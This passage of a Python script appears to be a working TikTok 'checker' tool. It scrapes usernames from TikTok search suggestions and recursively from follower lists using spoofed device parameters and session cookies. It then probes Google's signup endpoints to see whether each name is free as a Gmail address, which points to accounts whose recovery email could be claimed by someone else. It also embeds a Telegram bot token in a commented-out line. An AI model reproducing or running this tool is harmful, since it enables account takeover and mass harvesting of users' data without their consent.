                'source-path': '/lifecycle/steps/signup/name',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data_post_1 = f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{N}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
            
            async with session.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params_post_1,
                data=data_post_1,
            ) as response:
                await response.text()
            params_post_2 = {
                'rpcids': 'eOY7Bb',
                'source-path': '/lifecycle/steps/signup/birthdaygender',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data_post_2 = long_encoded_string.format(b[0], b[1], b[2], at)

            async with session.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params_post_2,
                data=data_post_2,
            ) as response:
                await response.text()
            params_post_3 = {
                'rpcids': 'NHJMOd',
                'source-path': '/lifecycle/steps/signup/username',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data_post_3 = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'

            async with session.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params_post_3,
                data=data_post_3,
            ) as response:
                final_response_text = await response.text()
            if 'password' in final_response_text:
                return {'status': 'Good', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}
            else:
                return {'status': 'Bad', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}

    except Exception as e:
        pass
        #requests.post(f'https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendMessage?chat_id=7402878964&text={e}')

from PKK import Gmail
async def s():
    global h, gt, bg, bt, blog, blo, sese
    
    async with aiohttp.ClientSession() as ses:    
        agent = str(generate_user_agent())
        faker = Faker()
        faker1 = Faker('ar')
        faker2 = Faker('hi_IN')
        faker3 = Faker('tr_TR')
        faker4 = Faker('fa')
        faker5 = Faker('en_NG')
        
        cl = '1234567890qwertyuiopasdfghjklzxcvbnm.'
        num = '6789'
        mu = faker.user_name()
        bh = faker1.user_name()
        ch = faker2.user_name()
        dh = faker3.user_name()
        hh = faker4.user_name()
        gh = faker5.user_name()
        
        arabic_letters = 'ابتثجحخدذرزسشصضطظعغفقكلمنهوي'
        hindi_letters = 'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ'
        turkish_letters = 'abcçdefgğhıijklmnoöprsştuüvyz'
        nigerian_letters = 'abcdefghijklmnopqrstuvwxyz'
        persian_letters = 'ابپتثجچحخدذرزسشصضطظعغفقکگلمنوهی'
        
        all_letters = arabic_letters + hindi_letters + turkish_letters + nigerian_letters + persian_letters
        keyword = ''.join((random.choice(all_letters) for i in range(random.randrange(3, 15))))
        
        rng = int("".join(random.choice(num) for _ in range(1)))
        name = "".join(random.choice(cl) for _ in range(rng))
        user = random.choice([mu, bh, ch, dh, hh, gh, name])

        params = {
            'WebIdLastTime': str(int(time.time())),
            'aid': '1988',
            'app_language': 'ar',
            'app_name': 'tiktok_web',
            'browser_language': 'en-US',
            'browser_name': 'Mozilla',
            'browser_online': 'true',
            'browser_platform': 'Linux armv81',
            'browser_version': agent,
            'channel': 'tiktok_web',
            'cookie_enabled': 'true',
            'data_collection_enabled': 'false',
            'device_id': '73' + ''.join(random.choices('0123456789', k=16)),
            'device_platform': 'web_pc',
            'focus_state': 'true',
            'from_page': 'search',
            'history_len': '3',
            'is_fullscreen': 'false',
            'is_page_visible': 'true',
            'keyword': user,
            'odinId': '73' + ''.join(random.choices('0123456789', k=16)),
            'os': 'linux',
            'priority_region': '',
            'referer': '',
            'region': 'DE',
            'screen_height': '780',
            'screen_width': '360',
            'tz_name': 'Asia/Aden',
            'user_is_login': 'false',
            'webcast_language': 'ar',
        }

        headers = {
            'authority': 'www.tiktok.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'referer': f'https://www.tiktok.com/search?q={user}&t={str(int(time.time()*1000))}',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': agent,
        }

        async with ses.get(
            'https://www.tiktok.com/api/search/general/preview/',
            params=params,
            headers=headers
        ) as r:
            try:
                res = await r.json()
            except:
                return

        if 'sug_list' in res:
            for users in res['sug_list']:
                email =users['content'].replace(" ", "")
                CheckTik = await Tik(email, ses)      
                if CheckTik == True:
                    gt += 1
                    await lo(email)
                    CheckGm = await gm(email) 
                    if CheckGm == {'status': 'Good', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}:
                        
                        h += 1
                        await lo(email)
                        await inf(email, h)
                    elif CheckGm == {'status': 'Bad', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}:
                        bg += 1
                        await lo(email)
                    else:
                        bhhw=Gmail.CheckGmail(email)
                        if bhhw=={'Programmer': 'Ibn_Suleiman', 'Check': 'Good'}:
                        	h+=1
                        	await inf(email,h)
                        	await lo(email)
                        elif bhhw=={'Programmer': 'Ibn_Suleiman', 'Check': 'Bad'}:
                        	bg+=1
                        	await lo(email)
                        else:
                        	blog += 1
                        	await lo(email)
                elif CheckTik == False:
                    bt += 1
                    await lo(email)
                elif CheckTik == None:
                    sese += 1
                    await lo(email)
                else:
                    blo += 1
                    await lo(email)
async def clean_emails(file_path):
    with open(file_path, 'r') as f:
        lines = f.readlines()

    uniq = sorted(set([i.strip() for i in lines if i.strip() != ""]))

    with open(file_path, 'w') as f:
        for email in uniq:
            f.write(email + "\n")
    return uniq
async def remove_email(file_path, email_to_remove):
    with open(file_path, 'r') as f:
        lines = f.readlines()
    with open(file_path, 'w') as f:
        for line in lines:
            if line.strip() != email_to_remove:
                f.write(line)
async def s1(email, ses, file_path):
    global h, gt, bg, bt, blog, blo, sese
    CheckTik = await Tik(email, ses)
    if CheckTik ==True:
        gt += 1
        await lo(email)
        CheckGm = await gm(email)
        await remove_email(file_path, email)
        if CheckGm == {'status': 'Good', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}:                                  
                        h += 1
                        await lo(email)
                        await inf(email, h)     
        elif CheckGm == {'status': 'Bad', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}:
        	#await remove_email(file_path, email)
        	bg+=1
        	await lo(email)
        else:
                        bhhw=Gmail.CheckGmail(email)
                        if bhhw=={'Programmer': 'Ibn_Suleiman', 'Check': 'Good'}:
                        	h+=1
                        	await inf(email,h)
                        	await lo(email)
                        elif bhhw=={'Programmer': 'Ibn_Suleiman', 'Check': 'Bad'}:
                        	bg+=1
                        	await lo(email)
                        else:
                        	blog += 1
                        	await lo(email)
    elif CheckTik == False:
        await remove_email(file_path, email)
        bt += 1
        await lo(email)
    elif CheckTik == None:
        sese += 1
        await lo(email)
    else:
        blo += 1
        await lo(email)
import requests
import threading
from queue import Queue
from TikSign import *
from colorama import init, Fore

init(autoreset=True)

output_file = "MustafaList.txt"
visited = set()
queue = Queue()
counter = 1
lock = threading.Lock()


def fetch_user(username):
    try:
        response = requests.get(
            f'https://www.tiktok.com/@{username}',
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept-Language': 'en-US,en;q=0.9'
            },
            timeout=10
        ).text

        data = response.split('"userInfo":{"user":')[1].split('}</script>')[0]
        user_id = data.split('"id":"')[1].split('"')[0]
        sec_user_id = data.split('"secUid":"')[1].split('"')[0]
        return user_id, sec_user_id
    except:
        return None, None


def worker():
    global counter
    while True:
        username = queue.get()
        if username in visited:
            queue.task_done()
            continue

        visited.add(username)

        user_id, sec_user_id = fetch_user(username)
        if not user_id:
            queue.task_done()
            continue

        params = {
            "user_id": user_id,
            "count": "100",
            "page_token": "",
            "source_type": "4",
            "request_tag_from": "h5",
            "sec_user_id": sec_user_id,
            "manifest_version_code": "400603",
            "_rticket": "1763718767244",
            "app_language": "en",
            "app_type": "normal",
            "iid": "7546917635566356231",
            "app_package": "com.zhiliaoapp.musically.go",
            "channel": "googleplay",
            "device_type": "TECNO CL6",
            "language": "en",
            "host_abi": "arm64-v8a",
            "locale": "en",
            "resolution": "1080*2436",
            "openudid": "c63764221a4abb54",
            "update_version_code": "400603",
            "ac2": "wifi",
            "cdid": "ac0e559c-f9cd-4894-b890-393ea72405df",
            "sys_region": "US",
            "os_api": "35",
            "timezone_name": "Asia/Baghdad",
            "dpi": "480",
            "carrier_region": "IQ",
            "ac": "wifi",
            "device_id": "7388587736934598161",
            "os": "android",
            "os_version": "15",
            "timezone_offset": "10800",
            "version_code": "400603",
            "app_name": "musically_go",
            "ab_version": "40.6.3",
            "version_name": "40.6.3",
            "device_brand": "TECNO",
            "op_region": "IQ",
            "ssmix": "a",
            "device_platform": "android",
            "build_number": "40.6.3",
            "region": "US",
            "aid": "1340",
            "ts": "1763718687"
        }

        params.update(Newparams())
        ss = sign(params=params, version='8404')
        si=random.choice(lin);headers = {
            'User-Agent': "com.zhiliaoapp.musically.go/400603 (Linux; U; Android 15; en_US; TECNO CL6; Build/AP3A.240905.015.A2;tt-ok/3.12.13.44.lite-ul)",
            'Cookie': f"sid_tt={si}; sessionid={si}; sessionid_ss={si}"
        }
        headers.update(ss)

        page_token = ""

        while True:
            params["page_token"] = page_token
            try:
                r = requests.get(
                    "https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/follower/list/",
                    headers=headers,
                    params=params,
                    timeout=10
                ).json()
            except:
                break

            followers = r.get("followers", [])
            if not followers:
                break

            for user in followers:
                uname = user.get("unique_id")

                with lock:
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(uname + "\n")

                    print(Fore.GREEN+f"<{counter}>"+Fore.RESET +
                          "~~["+Fore.RED+uname+Fore.RESET+"]")

                    counter += 1

                if uname not in visited:
                    queue.put(uname)

            page_token = r.get("next_page_token", "")
            if not page_token:
                break

        queue.task_done()


def mainlist():
    username = input("Start Username: ")
    queue.put(username)

    for _ in range(50):
        threading.Thread(target=worker, daemon=True).start()

    queue.join()


#main()
            
#````````````°````````°`````
async def main1():
    file_path ='MustafaList.txt'
    emails = await clean_emails(file_path)
    semaphore = asyncio.Semaphore(50)
    async with aiohttp.ClientSession() as ses:
        async def sem_task(email):
            async with semaphore:
                await s1(email, ses, file_path)
        tasks = [asyncio.create_task(sem_task(email)) for email in emails]
        await asyncio.gather(*tasks)
async def mainn():
    kh = input('1.Random </> 2.From File </> 3.GetList: ')
    if kh == '1':
        while True:
            try:
                tasks = [asyncio.create_task(s()) for _ in range(20)]
                await asyncio.gather(*tasks)
            except Exception as ee:
                pass
                pass
    elif kh == '2':
      try:
        await main1()
      except Exception as ee16:
                print(ee16)
    elif kh=='3':
    	try:mainlist()
    	except Exception as ee1:
                pass
asyncio.run(mainn())